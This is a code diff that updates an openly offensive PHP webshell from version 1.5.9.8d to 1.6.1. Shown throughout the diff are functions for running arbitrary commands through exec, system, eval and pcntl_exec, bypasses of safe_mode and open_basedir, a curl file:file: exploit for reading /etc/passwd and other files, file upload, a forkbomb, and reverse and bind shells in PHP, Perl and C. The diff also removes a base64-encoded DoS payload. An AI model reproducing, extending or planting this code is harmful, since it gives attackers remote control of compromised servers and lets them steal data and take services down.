@@ -1,4 +1,5 @@
 <?php
+//th1s 1s ultr4l33t php websh3ll || uz3 1t f0r 3duc4t10n4l purp0zes 0nly :P
 if(isset($_GET['pfs'])) {
  findsock();
 }
@@ -7,19 +8,27 @@ if(isset($_GET['l0g1n'])) {
  $_SESSION['l0g1n']=session_id();;
 }
 if(!isset($_SESSION['l0g1n'])) {
- header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
+ header("Location: http://".$_SERVER['SERVER_NAME']."/404.html"); //debug: maybe usr HTTP_HOST here?
 }
-$ver="1.5.9.8d"; //devel
-$edit="16.11.2011"; 
+$ver="1.6.1"; 
 // --------------------------------------------- globals 
 error_reporting(0);
-$version=explode('.',phpversion());
-$VER=($version[0] * 10000 + $version[1] * 100 + $version[2]);
+$version=phpversion();
 $descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("pipe", "w")
 );
+// --------------------------------------------- recursive dir removal by Endeveit
+function rmrf($dir)
+{
+    if ($objs = glob($dir."/*")) {
+        foreach($objs as $obj) {
+            is_dir($obj) ? rmrf($obj) : unlink($obj);
+        }
+    }
+    rmdir($dir);
+}
 // --------------------------------------------- checking for enabled funcs
 function function_enabled($func) {
  $disabled=explode(",",@ini_get("disable_functions")); 
@@ -65,46 +74,50 @@ function sploent529($path) {
  $ch=curl_init();
  curl_setopt($ch,CURLOPT_URL,'file:file:////'.$path);
  curl_setopt($ch,CURLOPT_HEADER,0);
- echo "<plaintext>";
  if(FALSE==curl_exec($ch)) {
-  die ("    fail :( either there is no such file or exploit failed ");
+  echo ("    fail :( either there is no such file or exploit failed ");
+  curl_close($ch);
+  rmrf('file:');
+  die();
+ } else {
+  curl_close($ch);
+  rmrf('file:');
+  return TRUE;
  }
- curl_close($ch);
- unlink('file:/'.$path);
- $cnt=count($dirz);
- for ($i=$cnt;$i>=0;--$i) {
-  rmdir($dirz[$i]); 
- }
- rmdir('file:/');
- return TRUE; 
- }
+}
 // --------------------------------------------- php 5.1.6 ini_set bug
 function sploent516() {
- if (ini_get("safe_mode")) {
+ //safe_mode check
+ if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
   ini_restore("safe_mode");
-  if (ini_get("safe_mode")) {
+  if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
    ini_set("safe_mode", FALSE);
+   ini_set("safe_mode", "Off");
    ini_set("safe_mode", "0");
-   ini_set("safe_mode", "off");
-   if (ini_get("safe_mode")) {
+   if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
     echo "<font color=\"red\">safe mode: ON</font><br>";
+   } else {
+    echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
    }
+  } else {
+   echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
   }
+ } else {
+  echo "<font color=\"green\">safe mode: OFF</font><br>";
  }
- if (ini_get("open_basedir")=="0" || strtolower(ini_get("open_basedir"))=="none") {
+ //open_basedir check
+ if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL || strtolower(ini_get("open_basedir"))=="none") {
   echo "open_basedir: none<br>";
  } 
  else {
   ini_restore("open_basedir");
-  if (ini_get("open_basedir")=="0" || strtolower(ini_get("open_basedir"))=="none") {
+  if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL ||  strtolower(ini_get("open_basedir"))=="none") {
    echo "open_basedir: none || hello php-5.1.6 bugs<br>";
   } 
   else {
-   ini_set('open_basedir', NULL);
-   ini_set('open_basedir', '0');
-   ini_set('open_basedir', 'none');
-   if (ini_get('open_basedir')=='0' || strtolower(ini_get('open_basedir'))=='none') {
-    echo "open_basedir: none || hello php-5.1.6 bugs<br>";
+   ini_set('open_basedir', '/'); //TODO: debug: check on php 5.1.6, maybe we need NULL instead of '/'
+   if (ini_get("open_basedir")=="/") {
+    echo "open_basedir: / || hello php-5.1.6 bugs<br>";
    } 
    else {
     $basedir=TRUE;
@@ -239,10 +252,21 @@ switch ($_GET['p']) {
    echo 'php eval() <input name="wut" value="eval" type="radio"><br>';
    //echo 'SQL <input name="wut" value="sql" type="radio"><br>'; //TODO
    echo '</form>';
-    //TODO: need to somehow check for function_enabled pcntl_fork & pcntl_exec
-   echo "<br><font color=\"gray\">and this is kinda tough shit..</font><br>pcntl_exec:";
-   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray">save and execute <input name="script" type="text" size="10" value="./lol.sh"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
-
+    //determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?
+   if (extension_loaded('pcntl')) {
+    if (function_enabled('pcntl_fork')) {
+     if (function_enabled('pcntl_exec')) {
+     echo "<br>pcntl_exec:";
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
+     } else {
+      echo "<br>pcntl_exec is disabled!";
+     }
+    } else {
+     echo "<br>pcntl_fork is disabled!";
+    }
+   } else {
+    echo "<br>no pcntl.so here";
+   }
    echo "</body></html>";
   } else {
    if ($_POST["down"] != "on") {
@@ -254,49 +278,49 @@ switch ($_GET['p']) {
    if ($_POST["down"] != "on") {
    switch ($_POST["wut"]) {
     case "passthru":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'passthru"></form>';
      break;
     case "system":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'system"></form>';
      break;
     case "exec":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'exec"></form>';
      break;
     case "shell_exec":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'shell_exec"></form>';
      break;
     case "popen":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'popen"></form>';
      break;
     case "proc_open":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
      echo "$html"; echo "$input"; echo 'proc_open"></form>';
      break;
     case "eval":
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) {
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
@@ -304,7 +328,7 @@ switch ($_GET['p']) {
      <input name="wut" value="eval" type="hidden"></form>';
      break;
     case "pcntl":
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray">save and execute <input name="script" type="text" size="10" value="./lol.sh"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> command: <br><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
      break;
     case "sql":
      header('Location: '.$_SERVER['PHP_SELF'].'?p=ms');
@@ -360,22 +384,7 @@ switch ($_GET['p']) {
      $shelltext=stripslashes($_POST["command"]);
      switch (pcntl_fork()) {
       case 0:
-       //i know this could be done in other way, but...
-       $pcntlcode='#!'.$_POST["inter"].'
-       '.$shelltext.' '.$_POST["to"].' '.$_POST["pcfile"];
-       $fh=fopen($_POST["script"],"w");
-       if (!$fh) { echo "can`t fopen ".$_POST["script"]."!"; }
-       else {
-        fwrite($fh,$pcntlcode);
-        fclose($fh);
-        $ch=chmod($_POST["script"], 0755);
-        if (!$ch) { 
-         echo "chmod failed!<br>";
-        } else {
-         pcntl_exec($_POST["script"]);
-        }
-        unlink($_POST["script"]);
-       }
+       pcntl_exec($_POST["inter"],array("-c","".$_POST["command"]." ".$_POST["to"]." ".$_POST["pcfile"]));
        exit(0);
       default:
        break;
@@ -403,86 +412,39 @@ switch ($_GET['p']) {
 //TODO: sql!
  case "ms":
  echo $title;
- echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=ms"><font color="green"> haxor@pwnedbox$ </font> mysql -u <input name="user" type="text" maxlength="50" size="8" value="root"> -p<input name="pass" type="text" maxlength="50" size="8" value="****"> --host=<input name="host" type="text" maxlength="50" size="9" value="localhost"> --port=<input name="port" type="text" maxlength="5" size="4" value="3306"> -e "<input name="command" type="text" maxlength="500" size="40" value="'.htmlspecialchars(stripslashes($_POST["command"]), ENT_QUOTES, "UTF-8").'">" <input type="submit" value="Enter"><input name="sq" type="hidden" value="l"></form>';
  //
  if (!empty($_POST['sq'])) {
-  echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
-  //TODO: mysql_connect
-  $link=mysql_connect("".$_POST["host"].":".$_POST["port"]."","".$_POST["user"]."","".$_POST["pass"]."") or die(mysql_error());
-  echo stripslashes($_POST["command"]);
-  echo "</textarea>";
+  echo "todo";
  }
  break;
 // --------------------------------------------- sql end; file operations
  case "f":
-  echo $title;
-  //TODO: надо выводить мускул и echo file_get_contents во всех версиях пыха
-  // разделить curl, мускул, file_get_contents
-  echo '<font color="blue">---> read file </font><br>';
-  echo "<font color=\"gray\">";
-  echo "current dir: ".$_SERVER["DOCUMENT_ROOT"]."<br>";
-  echo "php API is: ".php_sapi_name()."<br>";
-  echo "php version is: ".phpversion()."<br>";
-  if ($VER <= 50209) {
-    if (empty($_POST["filer"])) {
-     sploent516();
-     echo "--------------------------------<br></font>";
-     $ololotext="/home/USER/public_html/DOMAIN/index.php";
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> php -r \'echo file_get_contents("<input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">");\'
-     <input name="filer" type="hidden" value="okz"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
-     if (!extension_loaded('curl')) {
-      echo "</font><br>fail, curl is required!";
-      break;
-     } else {
-      echo "curl: <br>";
-      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
-      <input name="filer" type="hidden" value="okz"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
-      if (empty($_POST["filename"])) { 
-       if ($basedir) {
-       //trying to use php <=5.2.9 curl bug
-        mkdir("file:");
-        chdir("file:");
-        mkdir("etc");
-        chdir("etc");
-        mkdir("passwd");
-        chdir("..");
-        chdir("..");
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "file:file:////etc/passwd");
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        echo '<font color="gray">';
-        echo "<plaintext>";
-        if(FALSE==curl_exec($ch)) {
-         echo "can`t read /etc/passwd. possibly exploit won`t work at all ";
-        }
-        curl_close($ch);
-       } 
-       else {
-        echo '<font color="gray">';
-        echo '/etc/passwd contents <br>(USERNAME:HOMEDIR)<br><br>';
-        $contentz=file_get_contents('/etc/passwd');
-        echo "--- /var/www ---<br>";
-        $lolregexp='/.*.:(\/var\/www.*):.*([\r\n]|$)/Um';
-        preg_match_all($lolregexp, $contentz, $matchez);
-        $i=0;
-        foreach ($matchez[1] as $uzerz) {
-         echo $uzerz.":".$matchez[2][$i]."<br>";
-         $i++;
-        }
-        echo "<br>--- /home ---<br>";
-        $lolregexp='/.*.:(\/home.*):.*([\r\n]|$)/Um';
-        preg_match_all($lolregexp, $contentz, $matchez);
-        $i=0;
-        foreach ($matchez[1] as $uzerz) {
-         echo $uzerz.":".$matchez[2][$i]."<br>";
-         $i++;
-        }
-       echo '</font></body></html>';
-       }
-      }
-     }
-    } else { //if empty filer end
-     //TODO: не выдавать куски страницы в результат
+  if (empty($_POST["down"])) {
+   echo $title;
+   echo '<font color="blue">---> read file </font><br>';
+   echo "<font color=\"gray\">";
+   echo "current dir: ".$_SERVER["DOCUMENT_ROOT"]."<br>";
+   sploent516();
+   echo "<br>--------------------------------<br></font>";
+  }
+  if (empty($_POST["filer"])) {
+   $ololotext="/home/USER/public_html/DOMAIN/index.php";
+   echo "php file_get_contents:<br>";
+   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
+   <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
+   //curl
+   if ( $version <= "5.2.9" ) {
+    echo "<br> curl exploit: <br>";
+    if (!extension_loaded('curl')) {
+     echo "&nbsp;&nbsp;fail, curl is required<br>";
+    } else {
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
+     <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
+    }
+   }
+  } else {
+   switch ($_POST["filer"]) {
+    case "php":
      if ($_POST["down"] == "on") {
       header("Content-Type: application/force-download");
       header("Content-Type: application/octet-stream");
@@ -491,36 +453,71 @@ switch ($_GET['p']) {
       header('Content-Disposition: attachment; filename="result.txt"');
      }
      $ololotext=($_POST["filename"]);
-     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
-     <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
-     <input name="filer" type="hidden" value="okz"><input type="submit" value="Enter"></form>';
-    }
-    if (!empty($_POST["filename"])) { 
-     echo '<font color="gray">';
-     sploent529($_POST["filename"]);
-    }
-  // ---------------------------------------- curl + php5.2.9 end
-  } else {
-   echo "open_basedir: ".ini_get('open_basedir')."<br>";
-   echo "</font>php versions >=5.2.9 are not supported yet<br>";
- }
+     if (empty($_POST["down"])) {
+      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
+      <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
+      <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input type="checkbox" name="down"> download </form>';
+     }
+     if (!empty($_POST["filename"])) { 
+      if (empty($_POST["down"])) {
+       echo '<font color="gray">';
+       echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
+      }
+      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?");
+      echo $contents;
+      if (empty($_POST["down"])) {
+       echo "</textarea>";
+      }
+      die(); 
+     }
+     break;  
+    case "curl":
+     if ($_POST["down"] == "on") {
+      header("Content-Type: application/force-download");
+      header("Content-Type: application/octet-stream");
+      header("Content-Type: application/download");
+      header("Accept-Ranges: bytes");
+      header('Content-Disposition: attachment; filename="result.txt"');
+     }
+     $ololotext=($_POST["filename"]);
+     if (empty($_POST["down"])) {
+      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
+      <input name="filename" type="text" maxlength="100" size="50" value="'.$ololotext.'">
+      <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input type="checkbox" name="down"> download </form>';
+     }
+     if (!empty($_POST["filename"])) { 
+      if (empty($_POST["down"])) {
+       echo '<font color="gray">';
+       echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
+      }
+      sploent529($_POST["filename"]);
+     }
+    break;
+   }
+  }
+  // curl + file_get_contents end
+  // upload
    echo '<br><font color="blue">---> upload file</font><br>';
    if (!ini_get('file_uploads')) {
     echo "file_uploads Off";
    } else {
     echo "<font color=\"gray\">post_max_size: ".ini_get('post_max_size')."<br>"; 
-    echo "<font color=\"gray\">upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
+    echo "upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
     echo "</font>";
-    echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'?p=f" method="post"><input name="filename" type="file">  <input type="submit" value="upload to" /> <input name="filepath" type="text" maxlength="100" size="20" value="./"> <input name="upload" type="hidden" value="okz"></form>';
-    //TODO: обработка загрузки файлов.
-
+    echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'?p=f" method="post"><input name="filename" type="file">  <input type="submit" value="upload to" /> <input name="filepath" type="text" maxlength="100" size="20" value="./"> <input name="upload" type="hidden" value="okz">';
+    if (is_writable("./")) {
+     echo "<font color=\"green\">(./ writable)</font>";
+    } else {
+     echo "<font color=\"red\">(./ readonly)</font>";
+    }
+    echo '</form>';
     if (!empty($_POST["upload"])) {
      if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
      {
        if (!move_uploaded_file($_FILES["filename"]["tmp_name"], $_POST['filepath']."".$_FILES["filename"]["name"])) {
         echo "<br>fukken failed<br>";
        } else {
-        echo "<br>winrar</br>";
+        echo "<br>upload done</br>";
        }
      } else {
         echo("<br>fukken failed<br>");
@@ -529,13 +526,10 @@ switch ($_GET['p']) {
    }
    echo "<br>";
    echo '<font color="blue">---> current dir</font><br>';
-   echo "<textarea cols=\"40\" rows=\"20\" style=\"background: black; color: gray;\">";
-   $d=getcwd();
-   $dh=opendir($d);
-   while( ($file=readdir($dh)) !== false ) {
-    echo "$file\n";
+   echo "<textarea cols=\"80\" rows=\"20\" style=\"background: black; color: gray;\">";
+   foreach (glob("{,.}*", GLOB_BRACE) as $filename) {
+    echo "".$filename." -> size ".filesize($filename)." -> chmod ".substr(sprintf('%o',fileperms($filename)), -4)."\n";
    }
-   closedir($dh);
    echo "</textarea><br>";
   break;
 // --------------------------------------------- file end; bind
@@ -546,6 +540,7 @@ switch ($_GET['p']) {
   } else {
    $nc='<font color="gray">(dont forget to setup nc <b>first</b>!)</font>';
    $semi='<font color="gray">dont forget to write <b>;</b> at the end of command!</font>';
+   echo '<font color="gray">(see result below)</font><br><br>';
    echo '<font color="blue">---> PHP </font><br>';
    if (!function_enabled('set_time_limit')) { echo '<font color="gray">warning! set_time_limit off!</font><br>'; }
    if (!function_enabled('ignore_user_abort')) { echo '<font color="gray">warning! ignore_user_abort off!</font><br>'; }
@@ -765,7 +760,9 @@ switch ($_GET['p']) {
    switch ($_POST["shellz"]) {
     case "phpremote":
     // code by pentestmonkey.net. license: GPLv2
-     set_time_limit (0);
+     @set_time_limit(0);
+     @ignore_user_abort(1);
+     @ini_set('max_execution_time',0);
      $ip=($_POST["ip"]);
      $port=($_POST["port"]);
      $chunk_size=1400;
@@ -810,8 +807,8 @@ switch ($_GET['p']) {
       }
      }
      fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);@proc_close($process);
-    break;
     //php backconnect end
+    break;
     case "phplocal":
      // code by metasploit.com. license unknown, assuming BSD
      @set_time_limit(0); 
@@ -876,6 +873,7 @@ switch ($_GET['p']) {
       @socket_write($msgsock,$buffer,strlen($buffer));
      }
      @socket_close($msgsock);
+     echo "<br><br><font color=\"green\">phplocal done</font>"; 
     break;
     //phpbind end
     case "perllocal1":
@@ -884,7 +882,7 @@ switch ($_GET['p']) {
     case "perllocal2":
      $exec_path = trim($_POST['path']);
      $fh=fopen($exec_path,'w');
-     if (!$fh) { echo "can`t fopen"; }
+     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
      else { 
       fwrite($fh,$perlbdcode);
       fclose($fh);
@@ -909,6 +907,7 @@ switch ($_GET['p']) {
        $fp=popen($c,'r');
        @pclose($fp);
       }
+      echo "<br><br><font color=\"green\">perllocal done</font>";
      }
     //perl bind end
     break;
@@ -918,7 +917,7 @@ switch ($_GET['p']) {
     case "perlremote2":
      $exec_path=trim($_POST['path']);
      $fh=fopen($exec_path,'w');
-     if (!$fh) { echo "can`t fopen"; }
+     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
      else {
       fwrite($fh,$perlbccode);
       fclose($fh);
@@ -943,12 +942,13 @@ switch ($_GET['p']) {
        $fp=popen($c,'r');
        @pclose($fp);
       }
+      echo "<br><br><font color=\"green\">perlremote done</font>";
      }
     break;
     //perl backconnect end
     case "clocal":
      $fh=fopen("bd.c","w");
-     if (!$fh) { echo "can`t fopen"; }
+     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; } 
      else {
       fwrite($fh,$cbdcode);
       fclose($fh);
@@ -971,12 +971,13 @@ switch ($_GET['p']) {
        $fp=popen($c,'r');
        @pclose($fp);
       }
+      echo "<br><br><font color=\"green\">clocal done</font>";
      }
     break;
     //C bind end
     case "cremote":
      $fh=fopen("bc.c","w");
-     if (!$fh) { echo "can`t fopen"; }
+     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
      else {
       fwrite($fh,$cbccode);
       fclose($fh);
@@ -1003,7 +1004,7 @@ switch ($_GET['p']) {
     break;
     case "findsock":
      $fh=fopen("findsock.c","w");
-     if (!$fh) { echo "can`t fopen"; }
+     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
      else {
       fwrite($fh,$findsock);
       fclose($fh);
@@ -1036,33 +1037,30 @@ switch ($_GET['p']) {
 // --------------------------------------------- bind end; extras 
  case "e":
   echo $title;
-  echo "SysInfo:<br>";
+  echo '<font color="blue">---> SysInfo</font><br>';
   echo '<font color="gray">httpd: '.getenv("SERVER_SOFTWARE").'<br>';
   echo "php API: ".php_sapi_name()."<br>";
-  echo "php: ".phpversion()."<br>";
-	sploent516();
-	echo "<br>";
+  echo "php version: ".$version."<br>";
+  sploent516();
+  echo "<br>";
   echo "current dir: ".getcwd()."<br>"; //TODO: use sploents to remove open_basedir here
   echo "uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
   echo "script owner: ".get_current_user()."<br>";
-  $processUser = posix_getpwuid(posix_geteuid());
-  echo "current user: ".$processUser['name']."<br>";
-  echo "<br><br></font>";
-  echo "Extraz:<br><br>";
-  if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; } 
-  else {
+  if(function_enabled('posix_getpwuid')) { 
+   $processUser = posix_getpwuid(posix_geteuid());
+   echo "current user: ".$processUser['name']."<br>";
+  } else {
+   echo "posix_getpwuid disabled!<br>";
+  }
+  echo "<br></font>";
+  echo '<font color="blue">---> Extraz</font><br><br>';
+  if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
+  } else {
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">
     <input name="extraz" type="hidden" value="info"><input type="submit" value="phpinfo()"></form><br>';
   }
-   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">☠<input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb">☠</form>';
-  //TODO: нормальная проверка версии пыха
-  if ( $VER >= 50300) {
-   echo $VER;echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e"><input type="submit" value="5.3.* DoS"><br><font color="gray"><br>doesn`t work on true-64bit OS </font>
-    <input name="extraz" type="hidden" value="dos_5.3.1-2"></form>';  
-  }
   if(function_enabled('posix_getpwuid')) {
-   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form>';
-
+   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form>';
    if (!empty($_POST["uidz"])) {
     echo "<br>";
     //code by oRb. license unknown, assuming WTFPL
@@ -1077,16 +1075,16 @@ switch ($_GET['p']) {
   if ($failflag=="1") {
    echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
  }
- if (!empty($_POST["extraz"])) {
+  echo '<br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
+  echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
+  //
+  if (!empty($_POST["extraz"])) {
    switch ($_POST["extraz"]) {
     case "fork":
      while(pcntl_fork()|1); 
      break;
-    case "dos_5.3.1-2":
-     eval(base64_decode("JGQ9Mi4yMjUwNzM4NTg1MDcyMDExZS0zMDg7IGVjaG8gImQ9IjsgZWNobyAkZDsKCg=="));
-     break;
     case "info":
-     phpinfo();
+     header('Location: '.$_SERVER['PHP_SELF'].'?p=pi');
      break;
     case "perlsh":
      //author/license unknown, assuming WTFPL 
@@ -1124,7 +1122,7 @@ switch ($_GET['p']) {
       exit(0);';
      $htaccess='Options +Indexes +FollowSymLinks +ExecCGI
 AddType application/x-httpd-cgi .pl';
-     if ($VER <= 50209) {
+     if ( $version <= "5.2.9" ) { 
       echo "<br> trying php5.1.6 sploent...<br>:";
       sploent516();
      }
@@ -1152,6 +1150,9 @@ AddType application/x-httpd-cgi .pl';
   }
   break;
 // extras end ###
+ case "pi":
+  phpinfo();
+  break;
 } 
 // :)
 ?>
